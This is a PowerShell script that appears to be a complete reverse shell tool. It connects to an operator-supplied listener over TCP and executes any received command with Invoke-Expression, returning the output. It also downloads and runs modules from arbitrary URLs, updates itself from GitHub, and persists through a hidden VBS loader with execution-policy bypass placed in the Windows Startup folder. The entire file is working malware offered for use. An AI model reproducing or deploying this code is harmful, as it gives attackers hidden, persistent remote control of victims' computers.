#1.0

try { Get-Content -Path ((Get-Item $PSCommandPath).DirectoryName + "\listener.txt") -ErrorAction Stop | ForEach-Object { $server = $_ } }
catch
{
	New-Item "listener.txt" | ForEach-Object { Write-Host "Can't find listener.txt file, creating it..." }
	$server = ""
}
while ($server -in @($null, "")) { $server = Read-Host "Enter listener IP and Port! [x.x.x.x:xxxxx]"; Add-Content -Value $server -Path "listener.txt" }

Write-Host ("Connecting to " + $server.Replace("'", "").Replace(",", ":").Replace(" ", ""))

$server = $server.Split(":")
$ip = $server[0]
$port = $server[1]

while ($TCPClient.Connected -ne "True")
{
	Start-Sleep -Seconds 1
	try
	{
		Invoke-Expression ('$TCPClient' + "= New-Object Net.Sockets.TCPClient('$ip', $port)")
	}
	catch { }
}

Write-Host "Sucessfully Connected!"

$NetworkStream = $TCPClient.GetStream()
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)

function WriteTCPMessage ([string]$String, [switch]$NoCommand, [switch]$NoNewLine)
{
	[byte[]]$script:Buffer = 0 .. $TCPClient.ReceiveBufferSize | ForEach-Object { 0 }
	
	if (-not ($NoCommand -or $NoNewLine)) { $sendmessage = ($String + "`n[DEEZ NUTS] > ") }
	if ($NoCommand -and -not $NoNewLine) { $sendmessage = "`n$String" }
	if ($NoNewLine -and -not $NoCommand) { $sendmessage = ($String + "`n[DEEZ NUTS] > ") }
	if ($NoCommand -and $NoNewLine) { $sendmessage = "$String" }
	
	$StreamWriter.Write($sendmessage)
	$StreamWriter.Flush()
	
	Write-Host $String
}

#ModuleParser

WriteTCPMessage "[ModuleParser v1.0]" -NoCommand
WriteTCPMessage "Searching For Modules...`n" -NoCommand
try { $modulelist = Get-ChildItem ("$PSScriptRoot\modules") "*.function" -ErrorAction Stop }
catch { New-Item -Path $PSScriptRoot -Name "modules" -ItemType "Directory" }
if ($modulelist -eq $null) { WriteTCPMessage "`nNo Modules Found!`n" }
else
{
	foreach ($module in $modulelist)
	{
		$moduleinfo = (Get-Content "$PSScriptRoot\modules\$module" -ReadCount 4 -ErrorAction SilentlyContinue).Replace("#", "") # 0 = loadname, 1 = versioninfo, 2 = prefixes and help, 3 = afterloadcommand
		$loadname = $moduleinfo[0]
		$versionname = $moduleinfo[1]
		$afterload = [array]$afterload + $moduleinfo[3]
		WriteTCPMessage ("loading $loadname v$versionname...") -NoCommand
		try
		{
			Invoke-Expression ([string](Get-Content "$PSScriptRoot\modules\$module" -Raw)) -ErrorAction Stop
			$loadedmodules = $loadedmodules + (Invoke-Expression $moduleinfo[2] -ErrorAction Stop)
			WriteTCPMessage "OK" -NoCommand -NoNewLine
		}
		catch { WriteTCPMessage "Error Parsing Module!" -NoCommand -NoNewLine }
	}
	WriteTCPMessage ("`nSucessfully Loaded " + $loadedmodules.Count + " Module(s)!`n") -NoCommand
	
	$afterload | ForEach-Object { Invoke-Expression $_ }
}
Remove-Variable module, moduleinfo, loadname, versionname -ErrorAction SilentlyContinue

function RunModule ($Action)
{
	$SplitAction = $Action.Split()
	#/module
	if ($SplitAction[0] -eq "module")
	{
		if ($SplitAction[1] -eq "store")
		{
			foreach ($module in (Invoke-RestMethod -Uri "https://api.github.com/repos/UltraAlex00/reverseshell-tools/contents/modules") | Select-Object -ExpandProperty name)
			{
				if ($module -in (Get-ChildItem $PSScriptRoot\modules *.function).Name) { WriteTCPMessage ($module.Replace(".function", "") + "  -  Installed") -NoCommand }
				else { WriteTCPMessage $module(".function", "") -NoCommand }
			}
			WriteTCPMessage "`n"
		}
		if ($SplitAction[1] -eq "installed")
		{
			if ((Get-ChildItem $PSScriptRoot\modules *.function) -ne $null)
			{
				WriteTCPMessage ("`n" + ([string]((Get-ChildItem $PSScriptRoot\modules).Name)).Replace(" ", "`n").Replace(".function", "") + "`n")
			}
			else { WriteTCPMessage "`nNo Modules Found!`n" }
		}
		if ($SplitAction[1] -eq "add")
		{
			if ($SplitAction[2] -eq "custom")
			{
				try
				{
					Invoke-WebRequest $SplitAction[3] -OutFile ("$PSScriptRoot\modules\" + $SplitAction[4] + ".function") -ErrorAction Stop
					WriteTCPMessage "`nSucessfully Downloaded Module!`nUse /restart to load!`n"
				}
				catch
				{
					if ($SplitAction[3] -eq $null) { WriteTCPMessage "`nEnter Uri!`n" }
					elseif ($SplitAction[4] -eq $null) { WriteTCPMessage "`nEnter Module Name!`n" }
					else { WriteTCPMessage "`nDownload Failed!`n" }
				}
			}
		}
		if ($SplitAction[1] -eq "remove")
		{
			try
			{
				Remove-Item ("$PSScriptRoot\modules" + $SplitAction[2]) -Force
				WriteTCPMessage ("`nSucessfully Removed" + $SplitAction[2] + "`n")
			}
			catch
			{
				if ($SplitAction[2] -eq $null) { WriteTCPMessage "`nEnter Module Name!`n" }
				else { WriteTCPMessage "`nModule Not Found!`n" }
			}
		}
		
		if ($SplitAction[1] -notin @("store", "installed", "add", "remove")) { WriteTCPMessage "`nInvalid Command!`n" }
	}
	#/ver
	if ($SplitAction[0] -eq "ver")
	{
		if ($SplitAction[1] -eq $null) { WriteTCPMessage ("n`Version: " + (Get-Content $PSCommandPath -TotalCount 1) + "`nNewest: " + ([string](Invoke-WebRequest -Uri "https://raw.githubusercontent.com/UltraAlex00/reverseshell-tools/main/rs.ps1").Content).Split()[0]) }
		elseif ($SplitAction[1] -eq "update")
		{
			try
			{
				WriteTCPMessage "`nUpdating..." -NoCommand -NoNewLine
				$oldpath = $PSCommandPath
				Remove-Item $PSCommandPath -Force
				Invoke-WebRequest -Uri "https://raw.githubusercontent.com/UltraAlex00/reverseshell-tools/main/rs.ps1" -OutFile $oldpath
				WriteTCPMessage "OK" -NoCommand
			}
			catch { WriteTCPMessage "Update Failed!" }
		}
	}
	#/restart
	if ($SplitAction[0] -eq "restart")
	{
		try { Get-Item (($PSCommandPath).DirectoryName + "\loader.vbs") -ErrorAction Stop }
		catch
		{
			$loaderbuilder = 'CreateObject("WScript.Shell").Run "powershell -ExecutionPolicy bypass -file """ & CreateObject("WScript.Shell").CurrentDirectory & "\rs.ps1""", 0'
			New-Item -Path ((Get-Item $PSCommandPath).DirectoryName + "\loader.vbs") -Value $loaderbuilder
		}
		try { Get-Item ("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" + "\loader.lnk") -ErrorAction Stop }
		catch
		{
			$loadershortcutbuilder = (New-Object -ComObject WScript.Shell).CreateShortcut(("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" + "\loader.lnk"))
			$loadershortcutbuilder.TargetPath = ((Get-Item $PSCommandPath).DirectoryName + "\loader.vbs")
			$loadershortcutbuilder.WorkingDirectory = (Get-Item $PSCommandPath).DirectoryName
			$loadershortcutbuilder.Save()
		}
		5 .. 1 | ForEach-Object { WriteTCPMessage "`nRestarting in $_ s" -NoCommand; Start-Sleep 1 }
		explorer ((Get-Item $PSCommandPath).DirectoryName + "\loader.lnk")
		exit
	}
	
	#/help
	if ($SplitAction[0] -eq "help")
	{
		if ($SplitAction[1] -eq $null)
		{
			foreach ($moduleindex in $loadedmodules.Keys)
			{
				WriteTCPMessage ("/" + $moduleindex + " - " + $loadedmodules[$moduleindex]) -NoCommand
			}
			WriteTCPMessage "`n"
		}
		else
		{
			try { WriteTCPMessage ("`n/" + $SplitAction[0] + " - " + $loadedmodules[$SplitAction[1]] + "`n") }
			catch { WriteTCPMessage "Module Not Found!`n" }
		}
	}
	#loaded modules
	if ($SplitAction[0] -notin @("modules", "ver", "help"))
	{
		if ($SplitAction[0] -in $loadedmodules.Keys)
		{
			Invoke-Expression ([string]$SplitAction)
		}
		else { WriteTCPMessage "`nInvalid Command!`n" }
	}
}

WriteTCPMessage ''

while (($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0)
{
	$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
	if ($Command.Substring(0, 1) -eq "/") { RunModule $Command.Substring(1) }
	else
	{
		$Output = try
		{
			Invoke-Expression $Command 2>&1 | Out-String
		}
		catch
		{
			$_ | Out-String
		}
		WriteTCPMessage ($Output)
	}
}
$StreamWriter.Close()
Clear-Host